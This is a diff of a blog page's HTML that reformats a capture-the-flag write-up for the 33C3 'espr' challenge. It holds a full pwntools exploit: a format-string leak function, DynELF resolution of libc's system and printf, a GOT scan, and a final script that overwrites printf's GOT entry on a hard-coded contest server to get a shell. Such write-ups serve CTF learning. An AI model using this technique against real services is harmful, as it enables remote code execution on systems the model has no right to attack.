@@ -298,27 +298,26 @@ pwn:                  repeat:
 
 <p>So how are we gonna do this? Fortunately, <a href="https://github.com/Gallopsled/pwntools">pwntools</a> is here to rescue! <strong>By using the amazing <a href="http://docs.pwntools.com/en/stable/dynelf.html">DynELF</a> module, we’re able to resolve &amp; leak some address without the need for binary!</strong></p>
 
-<p>First we’ll need a <code class="highlighter-rouge">leak</code> function to let pwntools able to leak data at an arbitrary address. Here we exploit the format string vulnerability to leak an arbitrary address:
-```python leak
-def leak(addr):
-    payload = “%7$s.AAA”+p64(addr)
-    r.sendline(payload)
-    print “leaking:”, hex(addr)
-    resp = r.recvuntil(“.AAA”)
-    ret = resp[:-4:] + “\x00”
-    print “ret:”, repr(ret)
-    r.recvrepeat(0.2) # receive the rest of the string
-    return ret</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Then we need a pointer into the binary. I got the pointer by entering `%30$p`, which returned `0x40060d`. Now we can use the `DynELF` module to help us resolve some function addresses.
+<p>First we’ll need a <code class="highlighter-rouge">leak</code> function to let pwntools able to leak data at an arbitrary address. Here we exploit the format string vulnerability to leak an arbitrary address:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">%7</span><span class="s">$s.AAA"</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="k">print</span> <span class="s">"leaking:"</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">".AAA"</span><span class="p">)</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">resp</span><span class="p">[:</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span>
+    <span class="k">print</span> <span class="s">"ret:"</span><span class="p">,</span> <span class="nb">repr</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span> <span class="c"># receive the rest of the string</span>
+    <span class="k">return</span> <span class="n">ret</span>
+</code></pre></div></div>
+<p>Then we need a pointer into the binary. I got the pointer by entering <code class="highlighter-rouge">%30$p</code>, which returned <code class="highlighter-rouge">0x40060d</code>. Now we can use the <code class="highlighter-rouge">DynELF</code> module to help us resolve some function addresses.</p>
 
-First we'll need to resolve the address of `printf` and `system`:
-```python leak library addresses
-d = DynELF(leak, 0x40060d)
-system_addr = d.lookup('system', 'libc')
-printf_addr = d.lookup('printf', 'libc')
+<p>First we’ll need to resolve the address of <code class="highlighter-rouge">printf</code> and <code class="highlighter-rouge">system</code>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">d</span> <span class="o">=</span> <span class="n">DynELF</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span> <span class="mh">0x40060d</span><span class="p">)</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">lookup</span><span class="p">(</span><span class="s">'system'</span><span class="p">,</span> <span class="s">'libc'</span><span class="p">)</span>
+<span class="n">printf_addr</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">lookup</span><span class="p">(</span><span class="s">'printf'</span><span class="p">,</span> <span class="s">'libc'</span><span class="p">)</span>
 
-log.success("printf_addr: "+hex(printf_addr))
-log.success("system_addr: "+hex(system_addr))
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"printf_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">printf_addr</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
 </code></pre></div></div>
 
 <p>It took a while because of <code class="highlighter-rouge">sleep(1)</code>, and pwntools will need a lot of addresses to resolve those functions.</p>
@@ -328,14 +327,13 @@ log.success("system_addr: "+hex(system_addr))
 
 <p>OK so now we know the offset between <code class="highlighter-rouge">printf</code> and <code class="highlighter-rouge">system</code>. Next time we’ll just have to leak <code class="highlighter-rouge">printf@got.plt</code>, calculate <code class="highlighter-rouge">system</code>’s address and use it to overwrite <code class="highlighter-rouge">printf</code>’s GOT entry, finally we’ll be able to hijack <code class="highlighter-rouge">printf</code>’s GOT and call <code class="highlighter-rouge">system("sh")</code> by entering “sh”.</p>
 
-<p>But first we’ll have to know the address of <code class="highlighter-rouge">printf@got.plt</code>. Luckily, not only can <code class="highlighter-rouge">DynELF</code> resolve function addresses, it can also resolve some useful addresses such as the pointer to the <code class="highlighter-rouge">.dynamic</code> section:
-```python resolve .dynamic section
-d = DynELF(leak, 0x40060d)
-dynamic_ptr = d.dynamic</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-Once we got the `.dynamic` section's address, we can use it to locate the `.got.plt` area:
+<p>But first we’ll have to know the address of <code class="highlighter-rouge">printf@got.plt</code>. Luckily, not only can <code class="highlighter-rouge">DynELF</code> resolve function addresses, it can also resolve some useful addresses such as the pointer to the <code class="highlighter-rouge">.dynamic</code> section:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">d</span> <span class="o">=</span> <span class="n">DynELF</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span> <span class="mh">0x40060d</span><span class="p">)</span>
+<span class="n">dynamic_ptr</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">dynamic</span>
 </code></pre></div></div>
-<p>Dynamic section at offset 0xe28 contains 24 entries:
+
+<p>Once we got the <code class="highlighter-rouge">.dynamic</code> section’s address, we can use it to locate the <code class="highlighter-rouge">.got.plt</code> area:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dynamic section at offset 0xe28 contains 24 entries:
   Tag        Type                         Name/Value
  0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
  0x000000000000000c (INIT)               0x400400
@@ -350,82 +348,81 @@ Once we got the `.dynamic` section's address, we can use it to locate the `.got.
  0x000000000000000a (STRSZ)              68 (bytes)
  0x000000000000000b (SYMENT)             24 (bytes)
  0x0000000000000015 (DEBUG)              0x0
- 0x0000000000000003 (PLTGOT)             0x601000  &lt;— here</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>```python resolve PLTGOT
-    cnt = 0
-    while True:
-        addr = dynamic_ptr + 0x10*cnt
-        ret = leak(addr)
-        if ret == "\x03\x00": #TYPE PLTGOT
-            addr += 8
-            for i in xrange(8):
-                ret = leak(addr+i)
-                print "ret:", ret.encode('hex')
-            break
-        else:
-            cnt += 1
+ 0x0000000000000003 (PLTGOT)             0x601000  &lt;--- here
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">addr</span> <span class="o">=</span> <span class="n">dynamic_ptr</span> <span class="o">+</span> <span class="mh">0x10</span><span class="o">*</span><span class="n">cnt</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">ret</span> <span class="o">==</span> <span class="s">"</span><span class="se">\x03\x00</span><span class="s">"</span><span class="p">:</span> <span class="c">#TYPE PLTGOT</span>
+        <span class="n">addr</span> <span class="o">+=</span> <span class="mi">8</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+            <span class="n">ret</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="n">addr</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
+            <span class="k">print</span> <span class="s">"ret:"</span><span class="p">,</span> <span class="n">ret</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
+        <span class="k">break</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">cnt</span> <span class="o">+=</span> <span class="mi">1</span>
 </code></pre></div></div>
 
-<p>Now we can find where <code class="highlighter-rouge">printf@got.plt</code> is, by leaking all the GOT entry and compare the low 12 bits of the function address (see if it ends with <code class="highlighter-rouge">550</code>):
-```python resolve printf@got.plt
-got = 0x601000
-for i in xrange(8):
-    addr = got + i*8
-    ret = leak(addr)
-    print “ret:”, ret.encode(‘hex’)</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-Finally, we can start exploiting the service:
-```python exp_espr.py
-#!/usr/bin/env python
+<p>Now we can find where <code class="highlighter-rouge">printf@got.plt</code> is, by leaking all the GOT entry and compare the low 12 bits of the function address (see if it ends with <code class="highlighter-rouge">550</code>):</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">got</span> <span class="o">=</span> <span class="mh">0x601000</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+    <span class="n">addr</span> <span class="o">=</span> <span class="n">got</span> <span class="o">+</span> <span class="n">i</span><span class="o">*</span><span class="mi">8</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+    <span class="k">print</span> <span class="s">"ret:"</span><span class="p">,</span> <span class="n">ret</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
+</code></pre></div></div>
 
-from pwn import *
-import subprocess
-import sys
-import time
+<p>Finally, we can start exploiting the service:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
 
-HOST = "78.46.224.86"
-PORT = 1337
-# setting 
-context.arch = 'amd64'
-context.os = 'linux'
-context.endian = 'little'
-context.word_size = 32
-# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
-context.log_level = 'INFO'
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">time</span>
 
-def leak(addr):
-    payload = "%7$s.AAA"+p64(addr)
-    r.sendline(payload)
-    print "leaking:", hex(addr)
-    resp = r.recvuntil(".AAA")
-    ret = resp[:-4:] + "\x00"
-    print "ret:", repr(ret)
-	r.recvrepeat(0.2)
-    return ret
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"78.46.224.86"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">1337</span>
+<span class="c"># setting </span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
+<span class="c"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
+
+<span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">%7</span><span class="s">$s.AAA"</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="k">print</span> <span class="s">"leaking:"</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">".AAA"</span><span class="p">)</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">resp</span><span class="p">[:</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span>
+    <span class="k">print</span> <span class="s">"ret:"</span><span class="p">,</span> <span class="nb">repr</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
+	<span class="n">r</span><span class="o">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">ret</span>
     
-if __name__ == "__main__":
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
 
-    r = remote(HOST, PORT)
+    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
 
-    printf_got = 0x601018
-    printf_addr = u64(leak(printf_got).ljust(8, "\x00"))
-    system_addr = printf_addr - 0x10e80 # remote
+    <span class="n">printf_got</span> <span class="o">=</span> <span class="mh">0x601018</span>
+    <span class="n">printf_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">(</span><span class="n">printf_got</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+    <span class="n">system_addr</span> <span class="o">=</span> <span class="n">printf_addr</span> <span class="o">-</span> <span class="mh">0x10e80</span> <span class="c"># remote</span>
 
-    log.success("printf_addr: "+hex(printf_addr))
-    log.success("system_addr: "+hex(system_addr))
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"printf_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">printf_addr</span><span class="p">))</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
 
-    byte1 = system_addr &amp; 0xff
-    byte2 = (system_addr &amp; 0xffff00) &gt;&gt; 8
-    log.success("byte1: "+hex(byte1))
-    log.success("byte2: "+hex(byte2))
+    <span class="n">byte1</span> <span class="o">=</span> <span class="n">system_addr</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
+    <span class="n">byte2</span> <span class="o">=</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&amp;</span> <span class="mh">0xffff00</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"byte1: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">byte1</span><span class="p">))</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"byte2: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">byte2</span><span class="p">))</span>
 
-    payload = "%" + str(byte1) + "c" + "%10$hhn."
-    payload += "%" + str(byte2-byte1-1) + "c" + "%11$hn."
-    payload = payload.ljust(32, "A")
-    payload += p64(printf_got) + p64(printf_got+1)
-    r.sendline(payload)
-    r.sendline("sh\x00")
-    r.interactive()
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">%</span><span class="s">"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">byte1</span><span class="p">)</span> <span class="o">+</span> <span class="s">"c"</span> <span class="o">+</span> <span class="s">"</span><span class="si">%10</span><span class="s">$hhn."</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">byte2</span><span class="o">-</span><span class="n">byte1</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="s">"c"</span> <span class="o">+</span> <span class="s">"</span><span class="si">%11</span><span class="s">$hn."</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">printf_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">printf_got</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p>flag: <code class="highlighter-rouge">33C3_f1rst_tshirt_challenge?!</code></p>
